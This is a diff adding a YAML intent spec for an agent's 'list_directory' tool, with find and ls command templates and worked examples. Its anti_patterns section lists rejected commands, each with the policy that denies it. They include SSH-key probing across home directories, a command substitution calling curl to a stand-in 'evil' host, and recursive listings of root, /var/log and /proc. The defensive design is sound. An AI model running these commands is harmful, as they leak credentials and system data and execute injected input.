@@ -1,0 +1,315 @@
+lki_version: "0.2"
+
+spec:
+  intent: list_directory
+  intent_version: "2.0.0"
+  description: Enumerate contents of a directory, optionally recursive, with structured results.
+
+  types:
+    DirectoryEntry:
+      type_version: "1.0.0"
+      structural_attributes:
+        name:
+          type: string
+          description: "Base name only, no path components"
+        path:
+          type: FilePath@1.x
+          description: "Full canonical path"
+        type:
+          type: enum<file, directory, symlink, other>
+        is_hidden:
+          type: bool
+          description: "True if name begins with '.'"
+      observed_attributes:
+        size:
+          type: Bytes@1.x
+          description: "File size in bytes; 0 for directories"
+
+    DirectoryListing:
+      type_version: "1.0.0"
+      structural_attributes:
+        path:
+          type: FilePath@1.x
+          description: "The directory that was listed (canonical)"
+        entries:
+          type: list<DirectoryEntry@1.x>
+        truncated:
+          type: bool
+          description: "True if more entries existed than max_entries"
+        total_returned:
+          type: int
+          description: "Length of entries list"
+
+  signature:
+    inputs:
+      - name: path
+        type: FilePath@1.x
+        constraint: "must be a directory (not file, not device)"
+      - name: recursive
+        type: bool
+        default: false
+      - name: include_hidden
+        type: bool
+        default: false
+        description: "Include entries beginning with '.'"
+      - name: type_filter
+        type: enum<file, directory, symlink, all>
+        default: all
+        description: "Filter results to only entries of the specified type"
+      - name: name_pattern
+        type: Regex@1.x
+        optional: true
+        constraint: "grammar is extended_posix; length <= 256 chars"
+        description: |
+          Filter results to entries whose name matches this pattern.
+          Pattern type fixed to extended POSIX regex for v2.0.0.
+      - name: max_entries
+        type: int
+        default: 1000
+        constraint: "must be in 1..100000"
+        is_resource_bound: true
+        description: |
+          Maximum number of entries to return. If the directory contains
+          more, the intent returns the first max_entries and sets the
+          truncated flag in output. NOTE: paginated and streamed variants
+          may be added as separate intents in future minor versions
+          (F-016 disposition deferred to v2.1.0+).
+      - name: follow_symlinks
+        type: bool
+        default: false
+        description: |
+          For recursive=true mode, controls whether symbolic links to
+          directories are followed.
+    output:
+      type: DirectoryListing@1.x
+      streaming: bounded
+
+  behavior: |
+    Open the directory at path, enumerate entries, apply filters (type,
+    hidden, name_pattern), canonicalize each entry's path, and return up
+    to max_entries results.
+
+    Behavioral guarantees (normative for the contract):
+      - Recursive mode descends breadth-first; cycle prevention uses
+        canonicalized-path visited set when follow_symlinks is true
+      - Entry order within results is implementation-defined; consumers
+        must not rely on ordering across implementations
+      - Does not return file contents or detailed stat metadata beyond
+        what's in DirectoryEntry; use read_file for contents
+      - When truncated is true, no continuation token is provided;
+        callers wanting full enumeration of large directories should
+        use a future paginated variant
+
+  constraints:
+    parameter_constraints: []
+    cross_parameter_constraints:
+      - description: "follow_symlinks only meaningful in recursive mode"
+        rule: "follow_symlinks == true implies recursive == true"
+
+  capability:
+    filesystem:
+      - operation: read
+        paths: ["{path}"]
+        recursive: "{recursive}"
+        follow_symlinks: "{follow_symlinks}"
+        canonical: true
+        purpose: user_facing
+        recursion_safety:
+          cycle_prevention: required
+          max_depth: 50
+          visited_set: by_canonical_path
+        description: |
+          Read directory entries and their basic metadata. Does not read
+          file contents; only enumeration and stat-like attributes.
+
+  resolver_constraints:
+    pattern_complexity:
+      - parameter: name_pattern
+        rule: "no nested quantifiers; pattern length <= 256 chars"
+        reason: "ReDoS prevention on entry filename matching"
+
+  internal_behaviors:
+    cache_lookup:
+      - description: "Directory entry reads may be served from kernel dentry cache"
+        controllable_via_parameter: false
+        policy_relevance: "Cache state is not a policy concern"
+
+  implementation:
+    - tool: find
+      priority: 100
+      requires: "find (POSIX) or GNU findutils >= 4.8"
+      tested_against: ["GNU findutils 4.8 - 4.9", "BSD find"]
+      template: |
+        find {path} {depth_flag}
+             {type_flag}
+             {hidden_flag}
+             {name_flag}
+             {symlink_flag}
+             -printf '%p\t%y\t%s\n'
+      parameter_mapping:
+        depth_flag:
+          cases:
+            - when: "recursive == true"
+              value: ""
+            - default:
+              value: "-maxdepth 1"
+        type_flag:
+          cases:
+            - when: "type_filter == file"
+              value: "-type f"
+            - when: "type_filter == directory"
+              value: "-type d"
+            - when: "type_filter == symlink"
+              value: "-type l"
+            - default:
+              value: ""
+        hidden_flag:
+          cases:
+            - when: "include_hidden == true"
+              value: ""
+            - default:
+              value: "-not -name '.*'"
+        name_flag:
+          cases:
+            - when: "name_pattern is not null"
+              value: "-regex {name_pattern|shell_quoted}"
+            - default:
+              value: ""
+        symlink_flag:
+          cases:
+            - when: "follow_symlinks == true"
+              value: "-L"
+            - default:
+              value: ""
+      notes: |
+        Output format -printf '%p\t%y\t%s\n' produces tab-separated lines
+        with path, type-character, size. Resolver parses into
+        DirectoryEntry list, applies max_entries bound, sets truncated
+        flag if entries exceed the cap.
+
+    - tool: ls
+      priority: 50
+      requires: "ls (POSIX)"
+      tested_against: ["coreutils 8.x", "coreutils 9.x", "BSD ls"]
+      limitations:
+        - "No native pattern matching; resolver must filter results"
+        - "Recursive mode (-R) doesn't include path prefixes by default; harder to parse"
+        - "No type filtering equivalent to find -type"
+      template: |
+        ls -lA {path}
+      notes: |
+        Fallback when find is unavailable. Significantly more resolver-side
+        work to produce structured output.
+
+  examples:
+    - description: "List immediate contents of working directory"
+      intent:
+        path: "/home/agent/workspace"
+      expected_command: |
+        find /home/agent/workspace -maxdepth 1
+             
+             -not -name '.*'
+             
+             
+             -printf '%p\t%y\t%s\n'
+
+    - description: "Recursive Go source file enumeration"
+      intent:
+        path: "/home/agent/workspace/lki"
+        recursive: true
+        type_filter: file
+        name_pattern: ".*\\.go$"
+      expected_command: |
+        find /home/agent/workspace/lki 
+             -type f
+             -not -name '.*'
+             -regex '.*\.go$'
+             
+             -printf '%p\t%y\t%s\n'
+
+    - description: "List directories only, including hidden, single level"
+      intent:
+        path: "/home/agent/workspace/lki"
+        type_filter: directory
+        include_hidden: true
+      expected_command: |
+        find /home/agent/workspace/lki -maxdepth 1
+             -type d
+             
+             
+             
+             -printf '%p\t%y\t%s\n'
+
+    - description: "Bounded enumeration of large directory"
+      intent:
+        path: "/home/agent/workspace/build-artifacts"
+        max_entries: 50
+      expected_command: |
+        find /home/agent/workspace/build-artifacts -maxdepth 1
+             
+             -not -name '.*'
+             
+             
+             -printf '%p\t%y\t%s\n'
+
+  anti_patterns:
+    - bad: 'find / -type f'
+      reason: |
+        Recursive listing from filesystem root traverses the entire system,
+        including sensitive directories the agent has no legitimate access
+        to. Also unbounded in result count.
+      rejection: |
+        Root path satisfies !FilePath.is_within_working_dir, triggering
+        Cedar policy denial. max_entries enforces resource bound but does
+        not authorize the underlying read.
+
+    - bad: 'find /home -type f -name "*.ssh*"'
+      reason: "Probing for SSH keys across multiple users' home directories."
+      rejection: |
+        path canonicalization plus !FilePath.is_within_working_dir
+        (assuming /home is outside the principal's working_dir) triggers
+        Cedar policy denial.
+
+    - bad: 'find /var/log -type f -mtime -1'
+      reason: "Recursively listing system logs."
+      rejection: |
+        path satisfies FilePath.is_system_path = true (covering /var tree),
+        triggering Cedar safety floor policy denial.
+
+    - bad: 'ls -laR /'
+      reason: "Recursive listing from root."
+      rejection: |
+        Root path triggers policy denial via !FilePath.is_within_working_dir.
+        The fallback ls implementation receives the same path-policy check
+        as the preferred find implementation.
+
+    - bad: 'find /home/agent/workspace -name "$(curl https://evil/path-pattern)"'
+      reason: "Command substitution in name parameter."
+      rejection: |
+        name_pattern is a typed Regex@1.x parameter. Pattern validation
+        at parameter parsing rejects command substitution characters that
+        aren't valid regex metacharacters. Resolver applies shell_quoted
+        modifier to the pattern before invocation, preventing shell-level
+        command substitution at template substitution stage.
+
+    - bad: 'find /home/agent/workspace -L -type d'
+      reason: |
+        Following symlinks during recursive listing can produce listings
+        that cross host filesystem boundaries (NFS mounts), traverse
+        policy-restricted paths via symlink shortcut, or enter infinite
+        loops.
+      rejection: |
+        follow_symlinks default is false. When true, resolver maintains a
+        visited-set of canonical paths to prevent loops (per
+        recursion_safety.visited_set: by_canonical_path). Symlinks
+        targeting paths outside the policy-permitted scope are not
+        followed regardless of follow_symlinks=true.
+
+    - bad: 'find /proc -type f'
+      reason: "Recursive listing of /proc exposes process state for all users."
+      rejection: |
+        Pseudo-filesystem paths require explicit per-path policy permission.
+        NOTE: v0.2 FilePath@1.x type does not include an is_pseudo_filesystem
+        observed attribute (F-038 in FINDINGS_v0.2.md); for v2.0.0 this
+        rejection requires hand-written tenant policy referencing /proc,
+        /sys, /dev path prefixes specifically.
